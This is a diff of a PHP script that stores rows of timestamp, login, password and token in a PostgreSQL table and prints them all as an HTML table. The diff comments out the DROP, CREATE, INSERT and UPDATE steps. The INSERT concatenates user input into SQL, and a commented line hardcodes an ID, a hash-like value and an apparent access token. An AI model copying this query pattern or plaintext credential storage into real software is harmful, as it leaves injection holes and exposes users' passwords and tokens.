@@ -9,12 +9,12 @@ $dsn = "pgsql:"
     . "password=" . $dbopts["pass"];
     
 $db = new PDO($dsn);
-
+/*
 $query = "DROP TABLE dados";
 $result = $db->query($query);
 echo var_dump($result);
 echo '<br><br>';
-/**/
+
 $query = "CREATE TABLE dados ("
     . "id1 VARCHAR(50),"
     . "id2 VARCHAR(50),"
@@ -31,17 +31,18 @@ $token = 'tt';
 $tempo = date('m/d/Y h:i:s a');
 $query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
 
-// $query = "UPDATE dados SET id2 = '121011974285544429' , id3 = '129b28ee403af9889f18c3fd6f3b9135c8', id4 = 'E12AAOYYpZCPyZB0BALd0WuUAuWTWKHIUCGzvCiB8jY3RwLZAUpdpvb7d7tmhIbmNcZAuIxX1vYsZAQQkSuHQ3TknkLDGHLQcnJ2oyVJZCtaRXPqCmblfcNjy3S5ZCgw574urWAggppaIKCP6rpQvD0ObUKh8pnnH7KOzo2352mZCHuzgZDZD' WHERE id1 = 'xmassage'; ";
+//$query = "UPDATE dados SET id2 = '121011974285544429' , id3 = '129b28ee403af9889f18c3fd6f3b9135c8', id4 = 'E12AAOYYpZCPyZB0BALd0WuUAuWTWKHIUCGzvCiB8jY3RwLZAUpdpvb7d7tmhIbmNcZAuIxX1vYsZAQQkSuHQ3TknkLDGHLQcnJ2oyVJZCtaRXPqCmblfcNjy3S5ZCgw574urWAggppaIKCP6rpQvD0ObUKh8pnnH7KOzo2352mZCHuzgZDZD' WHERE id1 = 'xmassage'; ";
 
 $result = $db->query($query);
 echo var_dump($result);
 echo '<br><br>';
+*/
 $query = "SELECT id1, id2, id3, id4 FROM dados";
 $result = $db->query($query);
 echo var_dump($result);
 echo '<br><br>';
 
-echo "<table>";
+echo '<table border="1" style="font-family:arial; font-size:7px;">';
 while ($row = $result->fetch(PDO::FETCH_ASSOC)) {
     echo "<tr>";
     echo "<td>" . htmlspecialchars($row["id1"]) . "</td>";
